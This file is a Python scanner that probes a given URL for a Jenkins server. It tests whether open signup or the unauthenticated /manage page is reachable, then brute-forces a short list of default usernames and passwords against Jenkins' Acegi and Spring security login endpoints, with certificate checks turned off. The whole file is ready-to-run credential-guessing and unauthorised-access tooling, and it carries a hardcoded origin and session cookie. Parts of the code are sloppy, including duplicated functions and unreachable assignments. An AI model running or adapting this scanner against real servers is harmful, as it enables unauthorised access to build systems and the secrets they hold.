import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(1000, 9999)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(1000, 9999)
def scan(url):
	try:
		r=requests.get(url,verify=False)
		reditList = r.history
		redit=reditList[len(reditList)-1].headers["location"]
		url=redit
	except:
		pass
	url1=url+'/manage'
	urls=url+'/login'
	urlss=url+'/signup'
	try:
		urlsss=url+'/j_acegi_security_check'
		#print url
		response = requests.get(url1,timeout=5,verify=False)
		responses = requests.get(urls,timeout=5,verify=False)
		responsess=requests.get(urlss,timeout=5,verify=False)
		if "Jenkins" in responses.text:
			if responsess.status_code==200:
				r0=True
			else:
				r0=False
			if ("Configure" in response.text) and ("Jenkins" in responses.text):
				r1=True
			else:
				r1=False
			user_list=['admin','jenkins','root','Admin']
			pass_list=['admin','admin123','Admin','Admin123','123456','jenkins']
			total=[]
			n=0
			for user in user_list:
				for pwd in pass_list:
					total.append((user,pwd))
			for t in total:
				username=t[0]
				password=t[1]
				body='j_username='+username+'&j_password='+password+'&from=%2F&Submit='
				# print(body)
				headers={
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
				'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '53',
				'Origin': 'https://jenkins.legacyserver.in',
				'Connection': 'close',
				'Cookie': 'JSESSIONID.1835cdbc=node06i44xd9gh2xl3p3131ldzho711867.node0; screenResolution=1536x864',
				'Upgrade-Insecure-Requests': '1',
				'Sec-Fetch-Dest': 'document',
				'Sec-Fetch-Mode': 'navigate',
				'Sec-Fetch-Site': 'same-origin',
				'Sec-Fetch-User': '?1'
				}
				# print(url)
				r=requests.post(urlsss,body,headers=headers,verify=False)
				reditList = r.history
				redit=reditList[len(reditList)-1].headers["location"]
				if 'loginError' not in redit:
					r2=True
					break
				else:
					n+=1
			if n==len(total):
				r2=False
			if r0 or r1 or r2:
				return True
			else:
				return False
		else:
			return False
		e0=True
	except:
		e0=False
	try:
		urlsss=url+'/j_spring_security_check'
		#print url
		response = requests.get(url1,timeout=5,verify=False)
		responses = requests.get(urls,timeout=5,verify=False)
		responsess=requests.get(urlss,timeout=5,verify=False)
		if "Jenkins" in responses.text:
			if responsess.status_code==200:
				r0=True
			else:
				r0=False
			if ("Configure" in response.text) and ("Jenkins" in responses.text):
				r1=True
			else:
				r1=False
			user_list=['admin','jenkins','root','Admin']
			pass_list=['admin','admin123','Admin','Admin123','123456','jenkins']
			total=[]
			n=0
			for user in user_list:
				for pwd in pass_list:
					total.append((user,pwd))
			for t in total:
				username=t[0]
				password=t[1]
				body='j_username='+username+'&j_password='+password+'&from=%2F&Submit='
				# print(body)
				headers={
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
				'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '53',
				'Origin': 'https://jenkins.legacyserver.in',
				'Connection': 'close',
				'Cookie': 'JSESSIONID.1835cdbc=node06i44xd9gh2xl3p3131ldzho711867.node0; screenResolution=1536x864',
				'Upgrade-Insecure-Requests': '1',
				'Sec-Fetch-Dest': 'document',
				'Sec-Fetch-Mode': 'navigate',
				'Sec-Fetch-Site': 'same-origin',
				'Sec-Fetch-User': '?1'
				}
				# print(url)
				r=requests.post(urlsss,body,headers=headers,verify=False)
				reditList = r.history
				redit=reditList[len(reditList)-1].headers["location"]
				if 'loginError' not in redit:
					r2=True
					break
				else:
					n+=1
			if n==len(total):
				r2=False
			if r0 or r1 or r2:
				return True
			else:
				return False
		else:
			return False
		e1=True
	except:
		e1=False
	if not e0 and not e1:
		return False

